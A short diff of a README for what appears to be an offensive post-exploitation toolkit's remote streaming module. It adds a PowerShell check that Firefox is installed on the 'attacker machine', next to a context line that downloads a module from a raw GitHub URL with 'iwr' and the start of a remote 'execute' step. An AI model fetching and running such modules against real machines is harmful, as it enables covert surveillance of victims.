@@ -13,6 +13,14 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Stream
 
 <br />
 
+**prerequesites:**
+```powershell
+#Make sure Firefox ( with MJPEG ) its installed on attacker machine
+[bool](Get-ItemProperty -Path "HKLM:\SOFTWARE\Mozilla\Mozilla Firefox" -EA SilentlyContinue).CurrentVersion
+```
+
+<br />
+
 **execute:**
 ```powershell
 #Build triggers script (remote)
